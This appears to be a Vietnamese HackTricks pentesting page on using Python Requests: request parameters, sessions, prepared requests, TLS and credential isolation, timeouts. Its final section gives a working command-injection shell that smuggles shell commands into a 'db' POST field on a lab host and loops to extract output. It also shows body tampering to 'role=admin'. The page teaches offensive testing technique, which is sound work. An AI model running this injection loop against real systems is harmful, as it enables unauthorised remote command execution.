# Yêu cầu web

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Các ví dụ này sử dụng các tham số request, thuộc tính response, bộ tuple tệp multipart và session được Requests ghi lại trong tài liệu.<sup>[[1]](#references)</sup> Các ví dụ dùng `verify=False` sẽ tắt xác minh chứng chỉ TLS và chỉ nên dùng trong thử nghiệm có kiểm soát.<sup>[[1]](#references)</sup>

```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
    resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
    return resp

def login(username, password):
    resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
    return resp

def get_info(name):
    resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
    guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
    return guid

def upload(guid, filename, data):
    resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
    guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
    return guid

def json_search(guid, search_string):
    resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
    return resp.json()

def get_random_string(guid, path):
    return ''.join(random.choice(string.ascii_letters) for i in range(10))
```

## Các request đã chuẩn bị để kiểm soát payload

`PreparedRequest` cho phép xem URL cuối cùng, headers và body đã mã hóa trước khi request được gửi. Hãy tạo nó bằng `Session.prepare_request()` (thay vì `Request.prepare()`) khi cần áp dụng cookies hoặc authentication của session; nếu luồng prepared cũng phải tuân theo các thiết lập proxy/CA từ môi trường, hãy hợp nhất chúng một cách tường minh bằng `merge_environment_settings()`.<sup>[[1]](#references)</sup>

```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```

Điều này hữu ích khi exploit cần encoding không tiêu chuẩn hoặc khi so sánh payload đã tạo với request được lưu trong `response.request`. Đây không phải là primitive cho raw HTTP: Requests lưu headers trong một mapping không phân biệt chữ hoa chữ thường, vì vậy việc gán một tên trùng lặp sẽ thay thế giá trị trước đó. Hãy dùng sender cấp thấp hơn nếu cần các dòng request sai định dạng hoặc các trường `Content-Length`/`Transfer-Encoding` trùng lặp riêng biệt cho [các bài kiểm tra HTTP request-smuggling](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Cô lập session, thông tin xác thực ngầm định và trạng thái TLS

Session mặc định tin cậy cấu hình môi trường. Nếu không cung cấp thông tin xác thực tường minh, Requests có thể lấy thông tin xác thực Basic từ `.netrc`; nó cũng có thể nhập cấu hình proxy và đường dẫn CA bundle từ các biến môi trường. Với các script truy cập URL do attacker kiểm soát, hãy tắt những đầu vào ngầm định này và chỉ cấu hình proxy/CA dành cho lab. Các bản phát hành trước 2.32.4 có thể chọn thông tin xác thực `.netrc` cho sai host khi nhận URL được tạo thủ công độc hại, trong khi `Session.trust_env = False` là giải pháp thay thế được tài liệu hướng dẫn khi không thể nâng cấp.<sup>[[1]](#references)[[4]](#references)</sup>

```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
```

Giữ session sử dụng `verify=False` tách biệt với các session yêu cầu TLS đã xác minh. Trong Requests trước phiên bản 2.32.0, một kết nối được mở lần đầu với `verify=False` có thể được tái sử dụng cho các request cùng origin sau đó, ngay cả khi các request đó chỉ định `verify=True`; nâng cấp sẽ khắc phục vấn đề trạng thái pool này, nhưng việc cách ly cũng giúp kiểm tra các exploit script dễ dàng hơn.<sup>[[5]](#references)</sup>

## Vòng lặp exploit đáng tin cậy

Requests không đặt timeout mặc định. Timeout `(connect, read)` không phải là giới hạn tổng thời gian thực: thành phần read giới hạn khoảng thời gian client chờ giữa các byte nhận được. Tắt chuyển hướng tự động khi target kiểm soát `Location`, sau đó xác thực từng chặng trước khi gửi request mới; nếu bật chuyển hướng, hãy kiểm tra `response.history`. Với response lớn hoặc không đáng tin cậy, hãy dùng `stream=True`, lặp qua các chunk có giới hạn và đóng response bằng context manager để giải phóng kết nối trong pool.<sup>[[1]](#references)</sup>

```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
    print(r.status_code, r.headers.get("Location"))
    for chunk in r.iter_content(64 * 1024):
        if len(body) + len(chunk) > limit:
            raise ValueError("response exceeds limit")
        body.extend(chunk)
```

## Lệnh Python để khai thác RCE

Vòng lặp lệnh kế thừa từ `Cmd` của Python; phương thức `default` xử lý các tiền tố lệnh không được nhận diện, `cmdloop` phân phối các dòng đầu vào và `re.DOTALL` cho phép mẫu trích xuất khớp qua nhiều dòng.<sup>[[2]](#references)[[3]](#references)</sup>

```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
    prompt = "Inject => "

    def default(self, args):
        output = RunCmd(args)
        print(output)

def RunCmd(cmd):
    data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
    r = requests.post('http://10.10.10.127/select', data=data)
    page = r.text
    m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
    if m:
        return m.group(1)
    else:
        return 1


term = Terminal()
term.cmdloop()
```



## References

- [1] [Giao diện dành cho nhà phát triển Requests](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Hỗ trợ trình thông dịch lệnh theo dòng](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Các thao tác biểu thức chính quy](https://docs.python.org/3/library/re.html)
- [4] [Requests dễ bị lộ thông tin xác thực `.netrc` thông qua URL độc hại](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Đối tượng Requests `Session` không xác minh các yêu cầu sau khi thực hiện yêu cầu đầu tiên với `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
